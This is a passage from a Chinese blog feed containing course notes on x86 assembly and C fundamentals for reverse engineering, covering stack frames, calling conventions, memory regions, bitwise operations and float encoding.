id="逻辑移位（无符号）"><a href="#逻辑移位（无符号）" class="headerlink" title="逻辑移位（无符号）"></a>逻辑移位（无符号）</h3><p>SHL左<strong>（有符号无符号的左移都用这个）</strong></p><p>SHR右</p><p>只补0，移出的位放到CF里</p><h3 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h3><p>ROL左</p><p>ROR右</p><p>把移出的位放到要补的地方，移出的位放到CF里</p><h3 id="带进位的循环移位"><a href="#带进位的循环移位" class="headerlink" title="带进位的循环移位"></a>带进位的循环移位</h3><p>RCL左</p><p>RCR右</p><p>把CF里放的值补上，移出的位放到CF里</p>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_基础</title>
      <link href="/2020/09/18/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/09/18/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文环境为vc6.0和32位汇编</p><p>和8月份那篇有些重复，不过是当时写的笔记懒得修改了，能ctrl+f查就行</p><br><h1 id="0x01-堆栈图"><a href="#0x01-堆栈图" class="headerlink" title="0x01 堆栈图"></a>0x01 堆栈图</h1><p>汇编代码是这样的：</p><p>这个是没call之前的</p><p><img src="https://i.loli.net/2020/08/26/3r6tjz4sRHSq8BJ.png" alt="image-20200826224059606.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">push 0x4</span><br><span class="line">push 0x3</span><br><span class="line">push 0x2</span><br></pre></td></tr></table></figure><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/h52TUsRBZitWnHX.png"></p><p>call之后</p><p><img src="https://i.loli.net/2020/08/26/WFYwcnKgLUH7Abx.png" alt="image-20200826223507775.png"></p><p>进入jmp</p><p><img src="https://i.loli.net/2020/08/26/KFZLa3qTf569m7c.png" alt="image-20200826224302522.png"></p><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/PxDNKlm18ABHiz4.png" alt="QQ截图20200826224552.png"></p><p>在把参数压入栈之后再把ebp栈底也也压入栈，之后把esp的值赋给ebp。</p><p>此时栈中情况是这样的（和图基本一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ediesp</span><br><span class="line">esi</span><br><span class="line">ebx</span><br><span class="line">断点×16</span><br><span class="line">原ebp的值ebp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>题外话：要注意的是<strong>堆栈平衡</strong>（调用完一个函数前和调用完一个函数后，堆栈没有变化），所以这些值稍后都会返回。</p><p>接下来把esp减了0x40。之后会填充cccccccc的值，cc相当于<code>int3</code>的硬编码，也就是断点，是为了防止缓冲区溢出。程序没用到的内存，需要做特别处理，否则程序会运行，所以程序会把不用的地方全写成cc。</p><p><strong>如果函数什么也不做，那么vc6会生成0x40的缓冲区，每多一个局部变量，便会多减4。long long减8。会在函数生成之前分配完成。</strong></p><p>然后就是<strong>push ebx，push esi，push edi</strong>，把寄存器原先的值保存一下，因为接下来要用到。</p><p><strong>（这里将三个寄存器压栈的原因就是相关调用约定（具体来说是 x86 cdecl ）将这三个寄存器规定为非易失寄存器。）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lea edi, dword ptr ss:[ebp-0x40]</span><br><span class="line">mov ecx, 0x10</span><br><span class="line">mov eax, 0xcccccccc</span><br><span class="line">rep stos dword ptr ptr es:[edi]</span><br><span class="line"></span><br><span class="line">mov eax, dword ptr ss:[ebp+0x8]</span><br><span class="line">add eax, dword ptr ss:[ebp+0xc]</span><br><span class="line">sub eax, dword ptr ss:[ebp+0x10]</span><br></pre></td></tr></table></figure><p>前四行都是在填充cc的值，没啥好说的，看看我上面写的和图就差不多能懂。lea取地址（0019FE90），然后就是ecx和rep的重复。</p><p>下面三行就是这个函数的作用，很简单，2+3-4，大概是下面这样的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">huibian</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b-c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">huibian</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后函数就结束了，堆栈平衡，把之间压入的寄存器ebx，esi，edi弹回去。</p><p>此时堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/rEbKNUmzF3su6YI.png" alt="QQ截图20200826231723.png"></p><p>然后把ebp的值传到esp里去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">断点×16</span><br><span class="line">原ebp的值ebp,esp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>然后再把ebp弹出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">返回地址esp</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebpebp</span><br></pre></td></tr></table></figure><p>retn就返回回去了（retn = pop eip）</p><p><img src="https://i.loli.net/2020/08/26/AfowlCZb8mB49h2.png" alt="QQ截图20200826232044.png"></p><p>因为要堆栈平衡，所以就<code>add esp, 0xc(12)</code>把参数的栈清掉。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一个函数的运行过程</p><ol><li>（把参数压入栈，参数是倒着压入的，先压入后面的参数）call跳转运行；</li><li>把栈底地址压入栈，同时让栈底变成push ebp的那个地址（方便存取参数），提升栈底；</li><li>留下缓存空间；</li><li>把寄存器的值压入栈（保存现场）；</li><li>程序把不用的地方（缓存空间）填入cc，否则垃圾数据会影响程序运行；</li><li>函数运行；</li><li>函数结束，各种清栈。</li></ol><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>上面提到的调用约定</p><table><thead><tr><th>调用约定</th><th>参数压栈顺序</th><th>平衡堆栈</th></tr></thead><tbody><tr><td>__cdecl</td><td>从右至左入栈（从后往前）</td><td>函数外部清理堆栈</td></tr><tr><td>__stdcall</td><td>从右至左入栈</td><td>函数内部清理堆栈</td></tr><tr><td>__fastcall</td><td>ECX/EDX传送前两个，剩下：从右至左入栈</td><td>只有两个不需要清理堆栈，多的在函数内部清理。</td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用方法</span></span><br><span class="line"></span><br><span class="line">返回类型 调用约定 函数名(参数)&#123;&#125;</span><br></pre></td></tr></table></figure><p>这个也是c和c++默认的调用约定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">15</span>(fun) (<span class="number">00401014</span>)</span><br><span class="line">add esp,<span class="number">8</span></span><br></pre></td></tr></table></figure><p>WindowsAPI的调用方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">10</span>(fun) (<span class="number">0040100f</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret <span class="number">8</span></span><br><span class="line"><span class="comment">//ret的意思是先ret再esp+8</span></span><br></pre></td></tr></table></figure><p>别的都是用堆栈（内存）传递数据，fastcall用寄存器edx，ecx传递数据。如果经常使用这个函数，应该用这种方式写函数。只有两个函数不需要清理堆栈。用这个约定最好只写两个参数，否则和别的区别不大。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mov edx,<span class="number">2</span></span><br><span class="line">mov ecx,<span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">0</span>(fun) (<span class="number">00401005</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>函数之前提前push的值不一定是当前函数的参数，因为经过优化之后，可能根本没用到当前参数，而是后面函数的参数。</p><p><strong>不要思维定势，认为参数只能压入栈。也可以放到寄存器等等，只要能让函数用到就行。</strong></p><br><h1 id="0x02-内存"><a href="#0x02-内存" class="headerlink" title="0x02 内存"></a>0x02 内存</h1><p>一个程序在内存中执行的时候，会把程序分成几个区域。</p><h2 id="代码区"><a href="#代码区" class="headerlink" title="代码区"></a>代码区</h2><p>可读可写，用来存放代码。</p><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>函数不调用时不分配堆栈。堆栈用来存放参数，局部变量，临时数据。</p><p><strong>局部变量的特点：</strong></p><ol><li>局部变量在程序编译完成后并没有分配固定的地址</li><li>在所属的函数没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存。</li><li>当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据，局部变量消失。</li><li>局部变量只能在函数内部使用，函数A无法使用函数B的局部变量</li><li><strong>局部变量的反汇编识别：[ebp-4]， [ebp-8]，[ebp-0xc]。</strong>不同的编译器有可能会是[esp+]，通过栈顶找值。</li></ol><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>动态申请的，大小是可变的。</p><p>可读可写。</p><h2 id="全局变量区"><a href="#全局变量区" class="headerlink" title="全局变量区"></a>全局变量区</h2><p>可读可写，存储全局变量。</p><p><strong>全局变量的特点：</strong></p><ol><li><p>全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就会存在。启动后里面是否有值取决于声明是否给定了初始值，如果没有，默认为0。</p></li><li><p>全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值。</p></li><li><p>全局变量直到程序结束才会被释放</p></li><li><p>全局变量就是所谓的<strong>基址</strong></p></li><li><p><strong>全局变量的反汇编识别：如果看到一个直接的地址，那它就是全局变量。因为它早确定了不会改了。</strong></p></li></ol><h2 id="常量区"><a href="#常量区" class="headerlink" title="常量区"></a>常量区</h2><p>只读，存储常量。</p><p>例子（字符常量）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">00401010</span>   push        ebp</span><br><span class="line"><span class="number">00401011</span>   mov         ebp,esp</span><br><span class="line"><span class="number">00401013</span>   sub         esp,<span class="number">4</span>Ch</span><br><span class="line"><span class="number">00401016</span>   push        ebx</span><br><span class="line"><span class="number">00401017</span>   push        esi</span><br><span class="line"><span class="number">00401018</span>   push        edi</span><br><span class="line"><span class="number">00401019</span>   lea         edi,[ebp<span class="number">-4</span>Ch]</span><br><span class="line"><span class="number">0040101</span>C   mov         ecx,<span class="number">13</span>h</span><br><span class="line"><span class="number">00401021</span>   mov         eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">00401026</span>   rep stos    dword ptr [edi]</span><br><span class="line"><span class="number">2</span>:        <span class="keyword">char</span>* a = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],offset string <span class="string">&quot;china&quot;</span> (<span class="number">0042201</span>c)</span><br><span class="line"><span class="number">3</span>:       <span class="keyword">char</span> b[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,[string <span class="string">&quot;china&quot;</span> (<span class="number">0042201</span>c)]</span><br><span class="line"><span class="number">00401034</span>   mov         dword ptr [ebp<span class="number">-0</span>Ch],eax</span><br><span class="line"><span class="number">00401037</span>   mov         cx,word ptr [string <span class="string">&quot;Hello World!\n&quot;</span>+<span class="number">4</span> (<span class="number">00422020</span>)]</span><br><span class="line"><span class="number">0040103</span>E   mov         word ptr [ebp<span class="number">-8</span>],cx</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line">a = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">*a = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">b[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1:       a = &quot;A&quot;;//a不是常量，而是char*所以可以修改</span><br><span class="line">00401042   mov         dword ptr [ebp-4],offset string &quot;A&quot; (0042201c)</span><br><span class="line">2:       *a = &#x27;B&#x27;;//出错，因为不能修改字符常量</span><br><span class="line">00401049   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040104C   mov         byte ptr [edx],42h</span><br><span class="line">3:       b[0] = &#x27;A&#x27;;//这种写法会把字符常量复制到堆栈，改的地方也是堆栈</span><br><span class="line">0040104F   mov         byte ptr [ebp-0Ch],41h</span><br></pre></td></tr></table></figure><br><h1 id="0x03-对于杂项基础的一些补充"><a href="#0x03-对于杂项基础的一些补充" class="headerlink" title="0x03 对于杂项基础的一些补充"></a>0x03 对于杂项基础的一些补充</h1><h2 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h2><p>十进制的定义是由10个符号组成，逢十进一。</p><p>n进制的定义是由n个符号组成，逢n进一，如果自己定义符号，而不是简单的12345等等，将给解密者带来很大麻烦。</p><p><strong>进制的运算不应该是靠转换，而是查表。</strong></p><p><img src="https://i.loli.net/2020/08/24/oGWm9J4TOxaAhP1.png"></p><p><strong>80-FF是负数，0到7F是正数</strong></p><h2 id="逻辑运算（与或非-异或-加密解密）-宽度"><a href="#逻辑运算（与或非-异或-加密解密）-宽度" class="headerlink" title="逻辑运算（与或非 异或 加密解密）(宽度)"></a>逻辑运算（与或非 异或 加密解密）(宽度)</h2><p>受硬件影响，数据有长度限制，超过宽度的数据会被丢掉。</p><p>我们学的是32位寄存器，最多能存储<code>32/4=8</code>个数字。所以如果<code>mov eax,123456789</code>，eax只会存储<code>23456789</code>。</p><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">or1001100110</span><br><span class="line">_________________________</span><br><span class="line">1011100111</span><br></pre></td></tr></table></figure><p>与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">and1001100110</span><br><span class="line">_________________________</span><br><span class="line">1001000100</span><br></pre></td></tr></table></figure><p>异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">xor1001100110</span><br><span class="line">_________________________</span><br><span class="line">0010100011</span><br></pre></td></tr></table></figure><p>非</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">not1001100110</span><br><span class="line">__________________________</span><br><span class="line">0110011001</span><br></pre></td></tr></table></figure><p>大部分加密解密都是用了异或的概念</p><p>例如加密2014，设置一个密钥5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2014转化为二进制就是 0010 0000 0001 0100</span><br><span class="line">密钥为 0101</span><br><span class="line">加密:</span><br><span class="line">0010 0000 0001 0100</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">加密结果为7541</span><br><span class="line">解密:</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0010 0000 0001 0100</span><br></pre></td></tr></table></figure><br><h1 id="0x04-异常"><a href="#0x04-异常" class="headerlink" title="0x04 异常"></a>0x04 异常</h1><p>0xC0000005访问错误</p><br><h1 id="0x05-一些别的写法"><a href="#0x05-一些别的写法" class="headerlink" title="0x05 一些别的写法"></a>0x05 一些别的写法</h1><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回类型 __declspec(naked) 函数名(形参)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器不会管裸函数，我们可以在裸函数里面直接写汇编</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __declspec(naked) <span class="built_in">fun</span>()&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不写ret的话里面一行汇编都没有，会导致函数call完无法返回，所以我们加ret让这个函数正确执行。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型的三个要素：</p><ol><li><p>存储数据的宽度</p></li><li><p>存储数据的格式</p></li><li><p>作用域</p></li></ol><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><table><thead><tr><th>整数类型</th><th>bit</th><th>字节</th><th>宽度</th></tr></thead><tbody><tr><td>char</td><td>8bit</td><td>1字节</td><td>byte</td></tr><tr><td>short</td><td>16bit</td><td>2字节</td><td>word</td></tr><tr><td>int</td><td>32bit</td><td>4字节</td><td>dword</td></tr><tr><td>long</td><td>32bit</td><td>4字节</td><td>dword</td></tr></tbody></table><p>unsigned无符号数</p><p>有符号数和无符号数在内存中是完全一样的，只是看你想怎么用它。</p><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><p><strong>浮点数是如何存储到内存中的：</strong></p><p>float的存储方式</p><p><img src="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png" alt="image-20200828213506250.png"></p><ol><li>先将这个浮点数的绝对值值化为二进制</li><li>将这个二进制数的小数点左移或者右移n位，直到小数点移动到前面只剩一个1</li><li>从小数点右边第一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入0，否则放入1。</li><li>如果n是左移得到的，说明指数是正的，第30位放入1。如果n是右移得到的或n=0，则在第30位放入0。</li><li>将n减去1后化为二进制，把值去掉第一位放入第29到第23位（7位）。</li></ol><p>因为float尾数部分只有24位，所以能精确到小数点后六位。不存在无符号float，因为第一位就是符号位了。</p><p><strong>double是64位的，8个字节（float是4个字节）</strong></p><br><p>首先把浮点数转换为二进制</p><p>例：8.25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">整数部分转换：</span><br><span class="line">8/2 = 40</span><br><span class="line">4/2 = 20</span><br><span class="line">2/2 = 10</span><br><span class="line">1/2 = 0 1</span><br><span class="line">1000</span><br><span class="line">小数部分转换：</span><br><span class="line">0.25*2 = 0.50</span><br><span class="line">0.5*2  = 1.01</span><br><span class="line">1000.01</span><br></pre></td></tr></table></figure><p>8.25可以用二进制表示为1000.01</p><p>但如果是8.4就会进入死循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.4 * 2 = 0.80</span><br><span class="line">0.8 * 2 = 1.61</span><br><span class="line">0.6 * 2 = 1.21</span><br><span class="line">0.2 * 2 = 0.40</span><br></pre></td></tr></table></figure><p>这时候需要精确位数。</p><p>接着8.25继续，将小数点右移或者左移</p><p>1.00001 * 2^3</p><p>然后把00001存到尾数部分，后面跟着步骤来。</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>0</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>所以在内存中存入的值是41040000。</p><p> 如果是-8.25，也只需要变符号位</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>1</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>在内存中存入的值就是c1040000。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>标准aciss码由1个字节组成，最高位为0。</p><p>gb2312由2个字节组成，最高位为1。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>从逆向的角度来说</p><p>执行最快的是do while循环，其次是while循环，效率最差的是for循环。</p><h2 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">fun</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fun a;</span><br><span class="line">    a.y = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);<span class="comment">//78</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>特点：</p><ol><li>联合体的成员是共享内存空间的</li><li>联合体的内存空间大小是联合体成员中对内存空间要求最大的空间大小</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;fun;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fun.y = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,fun.x);<span class="comment">//78</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个是定义了类型名。一个是匿名联合体，同时创建变量。（结构体也可以这样用）</p><h2 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h2><p>typedef作用是为一种数据类型定义一个新名字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> WORD;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> DWORD;</span><br></pre></td></tr></table></figure><p>对数组的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> vector[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector v;<span class="comment">//相当于int 